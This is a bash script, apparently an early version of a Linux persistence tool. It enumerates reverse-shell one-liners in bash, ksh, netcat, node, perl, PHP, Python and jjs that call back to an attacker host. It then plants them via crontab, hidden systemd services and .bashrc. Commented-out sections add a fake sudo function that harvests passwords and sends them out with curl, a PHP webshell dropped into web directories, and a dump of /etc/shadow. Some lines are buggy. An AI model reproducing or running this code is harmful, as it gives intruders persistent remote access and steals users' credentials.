#!/bin/bash

# Modular version

# The basic idea is that you have commands that can execute reverse shells (methods, e.g. bash) and ways to make those shells persist on the system (doors, e.g. crontab)
# The script will enumerate all methods available and for each, enumerate all doors
# The goal is to eventually make it to where it will install a reverse shell everywhere it can for each method, with an option to do a dry run and not install anything, just enumerate everything

RHOST=0.0.0.0
RPORT=5253
CRON="* * * * *"
EZID=$(mktemp -d)
JJSFILE=$(mktemp)
PAYLOADFILE=$(mktemp)

METHODS=(
	# array entry format = method, eval statement, payload: <- the ":" is important, and the spaces around the commas
	# method = command that starts the reverse shell
	# eval statement = if return true, then we can do what we want with the command
	# NOTE: the eval statement is meant to account for the times where you can execute a command, therefore the exit status = 0 but the command itself prevents you from doing what you want (e.g. you can excute easy_install as any user but only install things as root [by default], and you can install a persistence script)
	# payload = just the bare minimum to run the reverse shell, the extra needed to install the payload somewhere (e.g. cron schedule) is handled in "doors"
	"bash , bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1':"
	"easy_install , echo 'import sys,socket,os,pty;exit()' > $EZID/setup.py; easy_install $EZID 2> /dev/null &> /dev/null , echo 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RPORT\"),int(os.getenv(\"RHOST\"))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn(\"$SHELL\")' > $EZID/setup.py; easy_install $EZID:"
	"jjs , echo \"quit()\" > $JJSFILE; jjs $JJSFILE , echo 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");var port=Java.type(\"java.lang.System\").getenv(\"RPORT\");var ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");var p=new ProcessBuilder(\"$SHELL\", \"-i\").redirectErrorStream(true).start();var Socket = Java.type(\"java.net.Socket\");var s=new Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs" 
	"ksh , ksh -c 'exit' , ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1':"
	"nc , $(nc -w 1 -lnvp 5253 &> /dev/null & nc 0.0.0.0 5253 &> /dev/null) , nc $RHOST $RPORT -e $SHELL:"
	"node , node -e 'process.exit(0)' , node -e 'sh = require(\"child_process\").spawn(\"$SHELL\");net.connect(process.env.RPORT, process.env.RHOST, function () {this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});':"
	"perl , perl -e \"use Socket;\" , perl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$SHELL -i\");};'" 
	"php , php -r \"exit();\" , php -r \"set_time_limit (0);\$ip = '$RHOST';\$port = $RPORT;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"ERROR Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip \$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }:"
	"python , python -c 'import socket,subprocess,os;exit()' , python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
	"python2 , python2 -c 'import socket,subprocess,os;exit()' , python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
	"python2.7 , python2.7 -c 'import socket,subprocess,os;exit()' , python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
	"python3 , python3 -c 'import socket,subprocess,os;exit()' , python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
	"python3.8 , python3.8 -c 'import socket,subprocess,os;exit()' , python3.8 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
)

# pass paylod to doors
enum_methods() {
	IFS=":"
	for s in ${METHODS[@]};
	do
		METHOD=$(echo $s | awk -F ' , ' '{print $1}')
		EVAL_STATEMENT=$(echo $s | awk -F ' , ' '{print $2}')
		PAYLOAD=$(echo $s | awk -F ' , ' '{print $3}')
		if $(echo $METHOD | grep -qi "[a-z]")
		then
			echo "$EVAL_STATEMENT" | $SHELL 2> /dev/null
			if [ $? -eq 0 ];
			then
				echo -e "\e[92m[+]\e[0m Method Found: $METHOD"
				enum_doors $PAYLOAD
			fi
		fi
	done
}



# enumerate where all backdoors can be placed
enum_doors() {
	
	DOORS=(
	# array entry format = door , eval statement , hinge: <- the ":" is important, and the spaces around the commas
	# door = command
	# eval statement = same as above
	# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
	"crontab , crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron; cat /dev/shm/.cron | grep -v linper > /dev/shm/.rcron; crontab /dev/shm/.rcron; if grep -qi [A-Za-z0-9] /dev/shm/.rcron; then crontab /dev/shm/.rcron; else crontab -r; fi; grep linper -qi /dev/shm/.cron , echo \"$CRON $PUTPAYLOADHERE\" >> /dev/shm/.rcron; crontab /dev/shm/.rcron; rm /dev/shm/.rcron:"
	"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c 'PUTPAYLOADHERE' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
	"bashrc , cd;find -writable -name .bashrc | grep -qi bashrc , echo \"$PAYLOAD 2> /dev/null & sleep .0001\" >> ~/.bashrc"
)
	IFS=":"
	for s in ${DOORS[@]};
	do
		if $(echo $PAYLOAD | grep -qi "[a-z]")
		then
			DOOR=$(echo $s | awk -F ' , ' '{print $1}')
			EVAL_STATEMENT=$(echo $s | awk -F ' , ' '{print $2}')
			HINGE=$(echo $s | awk -F ' , ' '{print $3}')
			if $(echo $DOOR | grep -qi "[a-z]")
			then
				echo "$EVAL_STATEMENT" | $SHELL 2> /dev/null
				if [ $? -eq 0 ];
				then
					if echo $DOOR | grep -qi "[a-z]";
					then
						echo "[+] Door Found: $DOOR"
						echo $PAYLOAD
						echo $HINGE
					fi
				fi
			fi
		fi
	done
	echo "-----------------------"
}

sudo_hijack_attack () {
	if $(cat /etc/group | grep sudo | grep -qi $(whoami));
	then
		echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
		echo "-----------------------"
		#echo 'function sudo () {
		#	realsudo="$(which sudo)"
		#	passwdfile="'$passwdfile'"
		#	read -s -p "[sudo] password for $USER: " inputPasswd
		#	printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $passwdfile
		#	sort -uo "$passwdfile" "$passwdfile"
		#	encoded=$(cat "$passwdfile" | base64) > /dev/null 2>&1
		#	curl -k -s "https://'$RHOST'/$encoded" > /dev/null 2>&1
		#	$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
		#	$realsudo "${@:1}"
		#	}' >> ~/.bashrc
		#echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
		#echo -e "\e[92m[+]\e[0m Stored in $passwdfile"
	fi
}

webserver_poison_attack () {
	if $(grep -qi "www-data" /etc/passwd)
	then
		if $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d | grep -qi "[A-Za-z0-9]")
		then
			echo -e "\e[92m[+]\e[0m Web Server Poison Attack Available for the Following Directories"
			for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d);
			do
				echo "$i"
			#	export php_webshell=.$(mktemp -u | sed 's/.*\.//g').php
			#	echo "<?php set_time_limit (0);\$ip = '$RHOST';\$port = $RPORT;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > $i/$php_webshell
			#	echo -e "\e[92m[+]\e[0m PHP reverse shell placed in $i/$php_webshell"
			done
			echo "-----------------------"
		fi
	fi
}


main (){
	enum_methods
	sudo_hijack_attack
	webserver_poison_attack
}

main

#RHOST=0.0.0.0
#RPORT=5253
#cron="* * * * *"
#passwdfile=$(mktemp)
#
#if [ "$EUID" -eq 0 ];
#then
#	root="yes"
#fi
#
#if $(id | grep -qi "www-data");
#then
#	wwwdata="yes"
#fi
#
#if $(which bash | grep -qi bash);
#then
#	bash="yes"
#fi
#
#if $(which ksh | grep -qi ksh);
#then
#	ksh="yes"
#then
#
#if $(which python | grep -qi python);
#then
#	python="yes"
#fi
#
#if $(which python3 | grep -qi python);
#then
#	python3="yes"
#fi
#
#if $(which nc | grep -qi nc);
#then
#	nc="yes"
#fi
#
#if $(which php | grep -qi php);
#then
#	php="yes"
#fi
#
#if $(env | grep -qi "HOME")
#then
#	home="yes"
#fi
#
#if $(which crontab | grep -qi crontab)
#then
#	crontab="yes"
#fi
#
#if $(cat /etc/group | grep sudo | grep -qi $(whoami))
#then
#	sudo="yes"
#fi
#
#if $(which systemctl | grep -qi systemctl)
#then
#	systemctl="yes"
#	export bash_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
#	export python_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
#	export python3_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
#	export netcat_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
#fi
#
#if [ "$wwwdata" == "yes" ];
#then
#	if [ "$php" == "yes" ];
#	then 
#		for i in $(find $(grep --color=never www-data /etc/passwd | awk -F: '{print $6}') -type d);
#		do
#			export php_webshell=.$(mktemp -u | sed 's/.*\.//g').php
#			echo "<?php set_time_limit (0);\$ip = '$RHOST';\$port = $RPORT;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > $i/$php_webshell
#			echo -e "\e[92m[+]\e[0m PHP reverse shell placed in $i/$php_webshell"
#		done
#			fi
#			fi
#
#			if [ "$crontab" == "yes" ];
#			then
#				crontab -l 2> /dev/null > /dev/shm/.cron.sh
#				if [ "$bash" == "yes" ];
#				then
#					echo "$CRON bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'" >> /dev/shm/.cron.sh
#					echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in crontab"
#				fi
#				if [ "$ksh" == "yes" ];
#				then
#					echo "$CRON ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'" >> /dev/shm/.cron.sh
#					echo -e "\e[92m[+]\e[0m Zsh reverse shell loaded in crontab"
#				fi
#				if [ "$python" == "yes" ];
#				then
#					echo "$CRON python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/.cron.sh
#					echo -e "\e[92m[+]\e[0m Python reverse shell loaded in crontab"
#				fi
#				if [ "$python3" == "yes" ];
#				then
#					echo "$CRON python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/.cron.sh
#					echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in crontab"
#				fi
#				if [ "$nc" == "yes" ];
#				then
#					echo "$CRON nc $RHOST $RPORT -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/.cron.sh
#					echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in crontab"
#				fi
#				crontab /dev/shm/.cron.sh
#				rm /dev/shm/.cron.sh
#			fi
#
#			if [ "$home" == "yes" ];
#			then
#				if [ "$bash" == "yes" ];
#				then
#					echo "bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' 2> /dev/null & sleep .0001" >> ~/.bashrc
#					echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in $(whoami)'s bashrc"
#				fi
#				if [ "$python" == "yes" ];
#				then
#					echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
#					echo -e "\e[92m[+]\e[0m Python reverse shell loaded in $(whoami)'s bashrc"
#				fi
#				if [ "$python3" == "yes" ];
#				then
#					echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
#					echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in $(whoami)'s bashrc"
#				fi
#				if [ "$nc" == "yes" ];
#				then
#					echo "nc $RHOST $RPORT -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
#					echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in $(whoami)'s bashrc"
#				fi
#				if [ "$sudo" == "yes" ];
#				then
#					echo 'function sudo () {
#					realsudo="$(which sudo)"
#					passwdfile="'$passwdfile'"
#					read -s -p "[sudo] password for $USER: " inputPasswd
#					printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $passwdfile
#					sort -uo "$passwdfile" "$passwdfile"
#					encoded=$(cat "$passwdfile" | base64) > /dev/null 2>&1
#					curl -k -s "https://'$RHOST'/$encoded" > /dev/null 2>&1
#					$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
#					$realsudo "${@:1}"
#				}' >> ~/.bashrc
#			echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
#			echo -e "\e[92m[+]\e[0m Stored in $passwdfile"
#				fi
#			fi
#
#			if [ "$root" == "yes" ];
#			then
#				if [ "$systemctl" == "yes" ];
#				then
#					if [ "$bash" == "yes" ];
#					then
#						echo "[Service]
#						Type=oneshot
#						ExecStartPre=$(which sleep) 60
#						ExecStart=$(which bash) -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' 2> /dev/null & sleep .0001
#						[Install]
#						WantedBy=multi-user.target" > /etc/systemd/system/$bash_rev_shell_service
#						chmod 644 /etc/systemd/system/$bash_rev_shell_service
#						systemctl start $bash_rev_shell_service 2> /dev/null & sleep .0001
#						systemctl enable $bash_rev_shell_service 2> /dev/null & sleep .0001
#						echo -e "\e[92m[+]\e[0m Bash reverse shell installed as a service at /etc/systemd/system/$bash_rev_shell_service"
#
#					fi
#					if [ "$python" == "yes" ];
#					then
#						echo "[Service]
#						Type=oneshot
#						ExecStartPre=$(which sleep) 60
#						ExecStart=$(which python) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001
#						[Install]
#						WantedBy=multi-user.target" > /etc/systemd/system/$python_rev_shell_service
#						chmod 644 /etc/systemd/system/$python_rev_shell_service
#						systemctl start $python_rev_shell_service 2> /dev/null & sleep .0001
#						systemctl enable $python_rev_shell_service 2> /dev/null & sleep .0001
#						echo -e "\e[92m[+]\e[0m Python reverse shell installed as a service at /etc/systemd/system/$python_rev_shell_service"
#					fi
#					if [ "$python3" == "yes" ];
#					then
#						echo "[Service]
#						Type=oneshot
#						ExecStartPre=$(which sleep) 60
#						ExecStart=$(which python3) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001
#						[Install]
#						WantedBy=multi-user.target" > /etc/systemd/system/$python3_rev_shell_service
#						chmod 644 /etc/systemd/system/$python3_rev_shell_service
#						systemctl start $python3_rev_shell_service 2> /dev/null & sleep .0001
#						systemctl enable $python3_rev_shell_service 2> /dev/null & sleep .0001
#						echo -e "\e[92m[+]\e[0m Python3 reverse shell installed as a service at /etc/systemd/system/$python3_rev_shell_service"
#					fi
#					if [ "$nc" == "yes" ];
#					then
#						echo "[Service]
#						Type=oneshot
#						ExecStartPre=$(which sleep) 60
#						ExecStart=$(which nc) $RHOST $RPORT -e /bin/bash 2> /dev/null & sleep .0001
#						[Install]
#						WantedBy=multi-user.target" > /etc/systemd/system/$netcat_rev_shell_service
#						chmod 644 /etc/systemd/system/$netcat_rev_shell_service
#						systemctl start $netcat_rev_shell_service 2> /dev/null & sleep .0001
#						systemctl enable $netcat_rev_shell_service 2> /dev/null & sleep .0001
#						echo -e "\e[92m[+]\e[0m Netcat reverse shell installed as a service at /etc/systemd/system/$netcat_rev_shell_service"
#					fi
#				fi
#				if [ "$php" == "yes" ];
#				then 
#					for i in $(find $(grep --color=never www-data /etc/passwd | awk -F: '{print $6}') -type d);
#					do
#						export php_webshell=.$(mktemp -u | sed 's/.*\.//g').php
#						echo "<?php set_time_limit (0);\$ip = '$RHOST';\$port = $RPORT;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > $i/$php_webshell
#						echo -e "\e[92m[+]\e[0m PHP reverse shell placed in $i/$php_webshell"
#					done
#						fi
#						echo -e "\e[92m[+]\e[0m Users with passwords from the shadow file"
#						egrep -v "\*|\!" /etc/shadow
#						fi
#
#						echo ""
#						echo -e "\e[92m[+]\e[0m All shells call back to $RHOST:$RPORT"